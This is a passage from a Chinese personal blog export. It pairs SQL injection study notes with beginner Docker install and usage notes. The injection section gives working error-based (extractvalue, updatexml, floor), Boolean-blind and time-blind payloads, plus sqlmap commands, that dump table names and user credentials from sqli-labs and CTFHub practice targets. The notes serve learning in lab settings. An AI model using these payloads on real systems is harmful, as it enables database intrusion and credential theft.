alt="image-20240201154118824"></p><p>下面来看看报错，你目录里面错了几个字母，他只是找不到东西，而添加了其它符号，他就会返回错误信息，比如在前面加上~</p><p><img src="/../image/image-20240201154805130.png" alt="image-20240201154805130"></p><p>所以，在报错之前，让报错回显我们想要的信息，比如库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractValue(doc,concat(0x7e,(select database()))) from xml;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201155248760.png" alt="image-20240201155248760"></p><p>拿Less-5试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,extractvalue(1,concat(0x7e,(select database()))),3 --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201160031944.png" alt="image-20240201160031944"></p><p>id&#x3D;100’ and 1&#x3D;extractvalue(1,concat(0x7e,(select database())))–+，这种写法也可以，因为是报错回显，所以不用在意回显位置</p><p>要查表名的，则把databas()这个函数换掉即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201162001229.png" alt="image-20240201162001229"></p><p>再获取users里的列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))) --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201162234530.png" alt="image-20240201162234530"></p><p>再获取列里需要的具体数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select group_concat(username,&#x27;~&#x27;,password) from users))) --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201162428529.png" alt="image-20240201162428529"></p><p>但数据不全，因为默认只能返回32个字节，所以可以在外面套个substring函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select substring(group_concat(username,&#x27;~&#x27;,password),25,30) from users))) --+</span><br></pre></td></tr></table></figure><p>表示从25往后再显示30个字符</p><p><img src="/../image/image-20240201162621595.png" alt="image-20240201162621595"></p><h4 id="uptatexml函数"><a href="#uptatexml函数" class="headerlink" title="uptatexml函数"></a>uptatexml函数</h4><p><img src="/../image/image-20240201162929770.png" alt="image-20240201162929770"></p><p>这个函数是三个参数的，原理和前面一样，也是把路径那个参数更改，第三个参数随便输个‘1’就行，下面拿Less-4来，这个是双引号+括号闭合的，先查查库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;...?id=1&quot;) and 1=extractvalue(1,concat(0x7e,(select database()))) --+</span><br></pre></td></tr></table></figure><p>查完库名再查表名,注意一下括号匹配</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201170838879.png" alt="image-20240201170838879"></p><p>查完表名查列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database())),3) --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201171212580.png" alt="image-20240201171212580"></p><p>再查内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select group_concat(username,&#x27;~&#x27;,password) from users)),3) --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201171319765.png" alt="image-20240201171319765"></p><p>一样是32个字节，需要用substring来慢慢看</p><h4 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h4><p><img src="/../image/image-20240201172417362.png" alt="image-20240201172417362"></p><p>rand()默认是0-1</p><p><img src="/../image/image-20240201172638092.png" alt="image-20240201172638092"></p><p>rand()*2则是生成0-2的随机数，如果在后面加上表，则表中有多少行rand就执行多少次</p><p><img src="/../image/image-20240201173129418.png" alt="image-20240201173129418"></p><p>floor()向下取整，如果是rand()*2则是1或0</p><p><img src="/../image/image-20240201172711522.png" alt="image-20240201172711522"></p><p>ceiling()向上取整，和floor类似</p><p><img src="/../image/image-20240201172754797.png" alt="image-20240201172754797"></p><p>concat_ws()将第2，3两个参数用第一个参数连接起来，可以通过修改参数获得需要的信息</p><p><img src="/../image/image-20240201172851655.png" alt="image-20240201172851655"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--库名</span><br><span class="line">select concat_ws(&#x27;~&#x27;,1,(select database()));</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201173544763.png" alt="image-20240201173544763"></p><p>还可以把1换成floor(rand()*2),方便后续统计数量</p><p>group by</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select concat_ws(&#x27;~&#x27;,floor(rand()*2),(select database())) as ben from users group by ben;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201181152735.png" alt="image-20240201181152735"></p><p>count()统计数量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*),concat_ws(&#x27;~&#x27;,floor(rand()*2),(select database())) as ben from users group by ben;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201183140877.png" alt="image-20240201183140877"></p><p>数字会变化，但和不会，这个要全0全1</p><p><img src="/../image/image-20240201183215704.png" alt="image-20240201183215704"></p><p><img src="/../image/image-20240201183240343.png" alt="image-20240201183240343"></p><p><img src="/../image/image-20240201194213286.png" alt="image-20240201194213286"></p><p>在里面的数字，应该是随机数种子，确定后就不会变了，0是会报错的，有些又不会，就用0把</p><p><img src="/../image/image-20240201195528155.png" alt="image-20240201195528155"></p><p><img src="/../image/image-20240201200009652.png" alt="image-20240201200009652"></p><p>往group_key写入数据时要重新进行计算，所以可能会导致重复</p><p>接下来试一试，基本就是把concat_ws的参数换成之前的代码，下面来看看表名，同样注意括号匹配,<strong>只要改concat_ws的参数即可，其它不用动</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as a from information_schema.tables group by a;--+</span><br></pre></td></tr></table></figure><p>还是挺长的<img src="/../image/image-20240201201242950.png" alt="image-20240201201242950"></p><p>最终也是获得了表名，下面来获取列名，同样的操作，替换语句即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),floor(rand(0)*2)) as a from information_schema.columns group by a; --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201201455769.png" alt="image-20240201201455769"></p><p>下面查找字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,(select group_concat(username,&#x27;-&#x27;,password) from users),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201202207721.png" alt="image-20240201202207721"></p><p>没显示。。。，去掉group试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,(select concat(username,&#x27;-&#x27;,password) from users),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201202329552.png" alt="image-20240201202329552"></p><p>加个限制一下,注意limit0,1指从0开始显示第1行，然后得加在修改得地方，其他地方不动，也可以用where id&#x3D;1，但有时候不一定又id这列，所以还是用第一种把</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,(select concat(username,&#x27;-&#x27;,password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201202511088.png" alt="image-20240201202511088"></p><p>但这个一行最多也是64个字节，如果太多可以加上substring，当然也是夹在修改得地方</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,substring((select concat(username,&#x27;-&#x27;,password) from users limit 0,1),2,4),floor(rand(0)*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201202819263.png" alt="image-20240201202819263"></p><p>从第二个字符开始，显示4个字符</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><img src="/../image/image-20240201203121868.png" alt="image-20240201203121868"></p><p><img src="/../image/image-20240201203311487.png" alt="image-20240201203311487"></p><p><strong>关键函数：ascii()</strong></p><p><img src="/../image/image-20240201203546134.png" alt="image-20240201203546134"></p><p>注意数字可以不带引号，字符需要加引号，字符串只显示第一个字符，所以我们需要用到substr函数，substr((),1,1)从第一个字符开始显示一个字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(substr((select database()),1,1))&gt;=130--+</span><br></pre></td></tr></table></figure><p>就是根据数据库名各个字符的ascii值，通过用范围逼近确定是哪个字母，一位一位确定，是不是呢，则通过页面返回的状态来确定，传真和传假的页面是不同的，可以先确定一下。感觉好麻烦，还是用sqlmao把</p><p>然后要查表名的话就是替换select database()即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201230553330.png" alt="image-20240201230553330"></p><p>这里就不要group了，一张表一张表确定比较合理。所以加上limit 0，1。下限确定，再确定上限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;106 --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201230856011.png" alt="image-20240201230856011"></p><p>因为知道是e，所以直接试试&#x3D;把。。。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201231128541.png" alt="image-20240201231128541"></p><p><img src="/../image/image-20240201231213126.png" alt="image-20240201231213126"></p><p>补充sqlmap</p><p>查库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-697209b99487bc8f.sandbox.ctfhub.com:10800?id=1&quot; --dbs  --batch</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240301225101809.png" alt="image-20240301225101809"></p><p>查表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-697209b99487bc8f.sandbox.ctfhub.com:10800?id=1&quot; -D sqli --tables  --batch</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240301225207030.png" alt="image-20240301225207030"></p><p>查列</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-697209b99487bc8f.sandbox.ctfhub.com:10800?id=1&quot; -D sqli -T flag --columns  --batch</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240301232736773.png" alt="image-20240301232736773"></p><p>查字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-697209b99487bc8f.sandbox.ctfhub.com:10800?id=1&quot; -D sqli -T flag -C flag --dump  --batch</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240301232805702.png" alt="image-20240301232805702"></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p><strong>关键函数：sleep 、if(condition,true,false)</strong></p><p>sleep挺多少秒，后面的if结合上一起看,就是前面的条件为真执行第二个函数，为假则执行最后一个，可以把sleep放在里面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select if(2&gt;1,sleep(3),sleep(2));</span><br></pre></td></tr></table></figure><p>使用方式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select if(ascii(substr((select database())&gt;100,1,1),sleep(0),sleep(3)) --+</span><br></pre></td></tr></table></figure><p>注入时建议先写参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(3)) --+</span><br></pre></td></tr></table></figure><p>慢慢查库名，这里直接用&#x3D;了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((select database()),1,1))=115,sleep(0),sleep(3))</span><br></pre></td></tr></table></figure><p>可以看到页面很快就刷新了。表名和列名则替换substr的第一个参数即可，和之前一样,记得加上 limit 0,1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(0),sleep(3))--+</span><br></pre></td></tr></table></figure><p>查列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))=105,sleep(0),sleep(3))--+</span><br></pre></td></tr></table></figure><p>查字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((select username from users limit 0,1),1,1))=105,sleep(0),sleep(3))--+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240202171741470.png" alt="image-20240202171741470"></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><img src="/../image/image-20240202173217774.png" alt="image-20240202173217774"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variable like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240202173059912.png" alt="image-20240202173059912"></p><p>null时不行，空着是都可以</p><p>这里拿Less-7来练习</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker</title>
      <link href="/2024/03/02/docker/"/>
      <url>/2024/03/02/docker/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>Hypervisor允许多个操作系统共享一个CPU(多核CPU的情况可以是多个CPU)。处于操作系统与硬件系统之间，用于实现多个虚拟机共享宿主机的硬件系统。</p><p>hyper-v则是微软提供的商业化Hypervisor，运行在windows系统上</p><p>KVM与Xen是linux系统上开源的Hypervisor</p><p>现在的Windows系统的架构（操作系统和应用层分别是两个虚拟机，位于Hyper-V之上）</p><p><img src="/../image/image-20240229202902295.png" alt="image-20240229202902295"></p><p>容器与虚拟机的最大区别是</p><p>虚拟机中存在独立的硬件系统与操作系统，但容器中的全部是共享的宿主机中的操作系统与硬件系统。</p><p>VMware Workstation 要等到15.5.5版本开始，才对VMM虚拟机技术进行了重构，之前需要直接调用CPU的虚拟化功能，现在调用Win10系统的WHP（Windows 的Hypervisor平台）的API，解决了VMware Workstation与Hyper-V的不兼容问题。</p><h2 id="Docker的架构图"><a href="#Docker的架构图" class="headerlink" title="Docker的架构图"></a>Docker的架构图</h2><p><img src="https://docs.docker.com/get-started/images/docker-architecture.webp" alt="Docker Architecture diagram"></p><p>Docker使用客户机-服务器架构。Docker客户端与Docker守护进程通信，后者完成构建、运行和分发Docker容器的繁重工作。Docker客户端和守护进程可以运行在同一个系统上，或者您可以将Docker客户端连接到远程Docker守护进程。Docker客户端和守护进程使用REST API，通过UNIX套接字或网络接口进行通信。另一个Docker客户端是Docker Compose，它允许你处理由一组容器组成的应用程序。</p><h2 id="Centos安装Doker"><a href="#Centos安装Doker" class="headerlink" title="Centos安装Doker"></a>Centos安装Doker</h2><p><a href="https://blog.csdn.net/weixin_41394654/article/details/123442460">CentOS7安装jdk</a></p><p>查看防火墙状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl status firewalld</span><br></pre></td></tr></table></figure><p>开启的话要关闭，然后可以做一个有基本命令和功能的基础虚拟机，然后用VM克隆。</p><p>centos的网卡文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/sysconfig/network-script/ifcfg-ens33</span><br></pre></td></tr></table></figure><p>配置完可以加到hosts文件，之后用MobaXterm连接可以直接用名字，解析更方便，不加也没关系</p><img src="../image/image-20240229221236567.png" alt="image-20240229221236567" style="zoom:67%;" /><p>下面安装仓库repository</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo yum install -y yum-utils</span><br><span class="line">$ sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><p>用阿里云的镜像地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum-config-manager --add-repo     http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"> </span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>看下yun的仓库文件下有没有Docker</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ll /etc/yum.repos.d</span><br></pre></td></tr></table></figure><p>安装Docker Engine</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum - y install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br></pre></td></tr></table></figure><p>加个-y用来同意，省的输入,下面这个可以用来看版本，挑想要的装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum list docker-ce --showduplicates | sort -r</span><br></pre></td></tr></table></figure><p>安装的时候把version string换成想要的即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install docker-ce- &lt;VERSION STRING&gt; docker-ce-cli- &lt;VERSION_ STRING》 containerd.io docker-compose-plugin</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>安装后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure><p>这一步记得在root权限执行，不然容易出问题</p><p><img src="/../image/image-20240229232953166.png" alt="image-20240229232953166"></p><p>然后,看一下自己有什么镜像</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>然后可以试一下hello world</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240229233235488.png" alt="image-20240229233235488"></p><p>因为没有这个镜像，一般会去下载默认的最新的这个镜像，没加tags默认就是leatest，然后latest：后面的那个就是拉取来源，hello到之后的内容就是镜像的结果，然后可以再看一下你的库里有什么</p><p><img src="/../image/image-20240229233440257.png" alt="image-20240229233440257"></p><p>可以发现多了个hello-world的镜像，然后上面有相应的信息</p><p>再来查看一下状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl status docker</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240301143347091.png" alt="image-20240301143347091"></p><p>这个disable说明这个不是自启动的，我们可以通过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure><p>来让他自启动</p><p><img src="/../image/image-20240301143544195.png" alt="image-20240301143544195"></p><p>练习的时候就不用自启动了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl disable docekr</span><br></pre></td></tr></table></figure><p>docker的关闭,关闭虚拟机时可以先关闭docker</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br></pre></td></tr></table></figure><h2 id="配置国内加速器官方教程"><a href="#配置国内加速器官方教程" class="headerlink" title="配置国内加速器官方教程"></a>配置国内加速器<a href="https://developer.aliyun.com/article/886423?accounttraceid=73363bc7579a4e34963fee55e20ac1b2rtpf">官方教程</a></h2><p>先登陆阿里云加速器的网站，然后进入镜像加速器的页面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://cr.console.aliyun.com/cn-hangzhou/mirrors</span><br></pre></td></tr></table></figure><p>在etc文件下创建一个docker目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br></pre></td></tr></table></figure><p>然后用tee命令把东西输入到daemon.json文件，这个文件是新建的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tee /etc/docker/dameon.json &lt;&lt;-&#x27;EOF&#x27;</span><br></pre></td></tr></table></figure><p>tee命令可以创建一个文件，然后你输入一个东西他会写进去并回显你输入的东西</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# tee hello.log</span><br><span class="line">hello</span><br><span class="line">hello</span><br><span class="line">hello 1</span><br><span class="line">hello 1</span><br><span class="line">hello 2</span><br><span class="line">hello 2</span><br><span class="line">^C</span><br><span class="line">[root@localhost ~]# cat hello.log</span><br><span class="line">hello</span><br><span class="line">hello 1</span><br><span class="line">hello 2</span><br></pre></td></tr></table></figure><p>具体内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# tee /etc/docker/dameon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt; &quot;registry-mirrors&quot;: [&quot;https://9e15pjnb.mirror.aliyuncs.com&quot;]</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; EOF</span><br><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;https://9e15pjnb.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">[root@localhost ~]# cat /etc/docker/dameon.json</span><br><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;https://9e15pjnb.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">[                  root@localhost ~]#</span><br></pre></td></tr></table></figure><p>然后重新加载一下配置和重启一下docker</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>拉一个centos：7的镜像试试,感觉还是挺慢的</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker pull centos:7</span><br><span class="line">7: Pulling from library/centos</span><br><span class="line">2d473b07cdd5: Pull complete</span><br><span class="line">Digest: sha256:be65f488b7764ad3638f236b7b515b3678369a5124c47b8d32916d6487418ea4</span><br><span class="line">Status: Downloaded newer image for centos:7</span><br><span class="line">docker.io/library/centos:7</span><br></pre></td></tr></table></figure><h2 id="Docker引擎的卸载"><a href="#Docker引擎的卸载" class="headerlink" title="Docker引擎的卸载"></a>Docker引擎的卸载</h2><ol><li><p>Uninstall the Docker Engine, CLI, containerd, and Docker Compose packages:</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo yum remove docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin docker-ce-rootless-extras</span></span><br></pre></td></tr></table></figure></li><li><p>Images, containers, volumes, or custom configuration files on your host aren’t automatically removed. To delete all images, containers, and volumes:</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">rm</span> -rf /var/lib/docker</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">rm</span> -rf /var/lib/containerd</span></span><br></pre></td></tr></table></figure></li></ol><p>3.还有一些自己创建的配置文件</p><h2 id="Docker发展"><a href="#Docker发展" class="headerlink" title="Docker发展"></a>Docker发展</h2><p>首发架构由两大核心组件构成: LXC(Linux Container) 与Docker Daemon。<br>首发架构的两大问题:</p><p>严重依赖于LXC，出现了“卡脖子”问题，及无法实现Docker跨平台。所以在0.9版本使用了Docker自研的Libcontainer替换了LxC。</p><p>Docker Daemon中的“大而全”使得版本更新难、性能出现瓶颈、不符合软件哲学(由Unix团队提出)，关键是，其还存在着“中心化”问题。所以在1.1版本中其实现了OCI规范，将容器运行时Runc从Docker Daemon中剥离出来。</p><h3 id="Docker引擎架构"><a href="#Docker引擎架构" class="headerlink" title="Docker引擎架构"></a>Docker引擎架构</h3><p><img src="/../image/image-20240301161001288.png" alt="image-20240301161001288"></p><ul><li>Docker Client：用户提交Docker命令。</li><li>Docked：负责REST API、处理镜像相关命令、网络、容器编排等。</li><li>Containerd：负责容器生命周期的管理，负责处理容器相关的命令，但不负责创建容器，当docker un命令的到来时会fork出Runc和Shim两个进程</li><li>Runc：负责创建容器进程，容器创建并启动后，将容器进程交给Shim处理，然后自己推出。</li><li>Shim：负责将容器与Docker Daemon进行解耦</li></ul><h3 id="Docker引擎分类"><a href="#Docker引擎分类" class="headerlink" title="Docker引擎分类"></a>Docker引擎分类</h3><p> Docker三大版本（Moby、CE、EE），两个小版本(edge月、stable季)</p><h2 id="镜像基础"><a href="#镜像基础" class="headerlink" title="镜像基础"></a>镜像基础</h2><h3 id="镜像简介"><a href="#镜像简介" class="headerlink" title="镜像简介"></a>镜像简介</h3><p>镜像是一种轻量级、可执行的独立软件包，也可以说是一个精简的操作系统。镜像中包含应用软件及应用软件的运行环境。具体来说镜像包含运行某个软件所需的所有内容，包括代码、库、环境变量和配置文件等。几乎所有应用，直接打包为 Docker 镜像后就可以运行。由于镜像的运行时是容器，容器的设计初衷就是快速和小巧，所以镜像通常都比较小，镜像中不包含内核，其共享宿主机的内核:镜像中只包含简单的 Shell，或没有 Shell。</p><p>busybox一个大的工具箱，集成了很多有用的linux命令工具等，堪称linux的瑞士军刀，下载一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull busybox</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/busybox</span><br><span class="line">9ad63333ebc9: Pull complete</span><br><span class="line">Digest: sha256:6d9ac9237a84afe1516540f40a0fafdc86859b2141954b4d643af7066d598b74</span><br><span class="line">Status: Downloaded newer image for busybox:latest</span><br><span class="line">docker.io/library/busybox:latest</span><br></pre></td></tr></table></figure><p>很小，就是一个微型的系统</p><h3 id="仓库分类"><a href="#仓库分类" class="headerlink" title="仓库分类"></a>仓库分类</h3><ul><li><p>Docker Official Image</p><p>Docker 官方镜像仓库。该类仓库中的镜像由 Docker 官方构建发布，代码质量较高且安全，有较完善的文档。该类仓库中的镜像会及时更新。一般常用的系统、工具软件、中间件都有相应的官方镜像仓库。例如，Zookeeper、Redis、Nginx 等。官方镜像仓库的名称<repository>一般直接为该类软件的名称<software-name>。“</p></li><li><p>Verified Publisher</p><p>已验证发布者仓库。该类仓库中的镜像由非 Docker 官方的第三方发布。但该第三方是由 Docker 公司审核认证过的，一般为大型企业、团体或组织。审核通过后，Docker 公司会向其颁发“VERIFIED PUBLISHER”标识。这种仓库中镜像的质量还有有保证的。除了官方镜像仓库，其它都是非官方镜像仓库。非官方镜像仓库名称<repository>一般由发布者用户名与软件名称两部分构成，形式为: <username>&#x2F;<software-name></p></li><li><p>Sponsored OSS</p><p>由 Docker 公司赞助开发的镜像仓库。该类仓库中的镜像也由非 Docker 官方的第三方发布，但该镜像的开发是由 Docker 公司赞助的。该类型的第三方一般为个人、团队或组织。这种仓库中镜像的质量也是有保证的。“</p></li><li><p>无认证</p></li></ul><p>​不安全</p><ul><li><p>第三方镜像中心</p><p>镜像中心默认使用的都是 Docker 官方的 Docker Hub。不过，镜像中心是可配置的，可以使用指定的第三方镜像中心。对于第三方镜像中心中的仓库名称<repository>由三部分构成:<domain-name>&#x2F;<username>&#x2F;<software-name>。其中的<domain-name>指的是第三方镜像中心的域名或IP。</p></li></ul><h3 id="镜像定位"><a href="#镜像定位" class="headerlink" title="镜像定位"></a>镜像定位</h3><p>对于任何镜像，都可通过<repository>:<tag>进行唯一定位。其中<tag>一般称为镜像的版本号。<tag>中有一个比较特殊的版本一-latest。如果不指定，默认<tag>即为 latest。不过，虽然其字面意思是最新版，一般其也的确存放的是最新版,但并不能保证其真的就是最新版。</p><h2 id="获取帮助信息"><a href="#获取帮助信息" class="headerlink" title="获取帮助信息"></a>获取帮助信息</h2><ol><li>官网获取<a href="https://docs.docker.com/reference/cli/docker/">https://docs.docker.com/reference/cli/docker/</a></li><li>docker –help</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker version --help</span><br></pre></td></tr></table></figure><h2 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker pull --help</span><br><span class="line">​</span><br><span class="line">Usage:  docker pull [OPTIONS] NAME[:TAG|@DIGEST]</span><br><span class="line">--DIGEST摘要，镜像内容的哈希值，用来验证内容是否被篡改，和TAG同作用，但TAG更方便</span><br><span class="line">​</span><br><span class="line">Download an image from a registry --拉取一个仓库</span><br><span class="line">​</span><br><span class="line">Aliases:</span><br><span class="line">  docker image pull, docker pull</span><br><span class="line">​</span><br><span class="line">Options:</span><br><span class="line">  -a, --all-tags                Download all tagged images in the repository --下载一个仓库的所有镜像，可能会下载很多东西</span><br><span class="line">      --disable-content-trust   Skip image verification (default true) --跳过镜像的验证，默认是跳过的，下第三方的时候最好设置成false</span><br><span class="line">      --platform string         Set platform if server is multi-platform --拉去指定架构的镜像，不常用，一般都是和自身架构匹配的</span><br><span class="line">                                capable</span><br><span class="line">  -q, --quiet                   Suppress verbose output</span><br><span class="line"> --省略下载的输出信息，减少信息冗余</span><br></pre></td></tr></table></figure><h2 id="docker-images"><a href="#docker-images" class="headerlink" title="docker images"></a>docker images</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# 